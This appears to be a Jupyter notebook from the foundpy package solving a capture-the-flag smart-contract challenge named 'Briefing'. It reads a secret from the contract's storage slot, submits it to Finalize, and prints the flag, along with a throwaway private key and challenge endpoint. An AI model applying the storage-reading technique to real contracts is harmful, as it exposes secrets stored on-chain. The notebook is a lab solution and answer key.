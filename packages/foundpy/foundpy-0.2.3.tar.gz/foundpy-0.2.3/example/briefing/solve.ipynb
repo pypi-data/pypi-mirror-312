{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from foundpy import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "solving PoW: s.AAAnEA==.4lhDtOJovmdeH/g1N0UWJQ==\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 10000/10000 [00:37<00:00, 265.35it/s]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PoW done\n",
      "UUID: bc720664-75fc-4a6a-8e71-be4e0001f537\n",
      "RPC Endpoint: http://103.178.153.113:30001/bc720664-75fc-4a6a-8e71-be4e0001f537\n",
      "Private Key: 0xc2daffaa718ab0710295e125f50f9d68fb2d68b65b97e20ea1b3a256b2a14df4\n",
      "Setup Contract: 0x87638897401A22C7127Dc60f5FaC527B9cF5eC02\n",
      "Wallet: 0xfeEf638A186246e79081e38c4707eb80123A11b1\n",
      "Message: your private blockchain has been deployed, it will automatically terminate in 30 minutes\n"
     ]
    }
   ],
   "source": [
    "result = config.from_tcp1p(\"http://103.178.153.113:30001\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "config.change_solc_version(\"0.8.25\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "setup = Contract(result[\"setup_contract\"], \"Setup.sol\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "setup.call(\"isSolved\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "briefing = Contract(setup.call(\"brief\"), \"Briefing.sol\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0x2233141a7b219eadca8ef269a043973616888e83e0f79698eb1ba39b5b1dc7d9')"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.send(\"verifyCall\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0x2a390128d22f93c676c086e26a12460582b82d0c92e8b9d2a2a4a9916c0ad3ee')"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.send(\"firstDeposit\", value=int(5 * 10**18))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0x490732f2ce0d04089f9edf81cc04ffe3c6d960da59aeefd270318a058878c1d7')"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.send(\"putSomething\", 1337, \"Casino Heist Player\", config.wallet.address)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0x38bC1f25E8f0535080C1a1fd0836b3293c6C0453'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'NowYouKnowStorageIsNotThatSafe..'\n"
     ]
    }
   ],
   "source": [
    "# secret = bytes.fromhex(\"4e6f77596f754b6e6f7753746f7261676549734e6f7454686174536166652e2e\")\n",
    "secret = briefing.storage(0)\n",
    "print(secret)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1922215132079289491\n"
     ]
    }
   ],
   "source": [
    "print(config.wallet.get_balance())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0x3a5214c4c6a11e396a350c5e51afdcbd4c3c35ec3a2444b4fb68c42644e76c8c')"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# config.wallet.send(briefing.address,int(1 * 10**18))\n",
    "# cast.send(briefing.address, \"\", value=ether(1))\n",
    "briefing.send(\"\", value=ether(1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0x5028560ed52f49265aa52b2eeefef18d491e7f2929dd62e59b27ac54a3e92360')"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.send(\"Finalize\", secret)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "setup.call(\"isSolved\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'ENUMA{Briefing_completed!_Now_Gearing_up!}'"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "config.flag()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
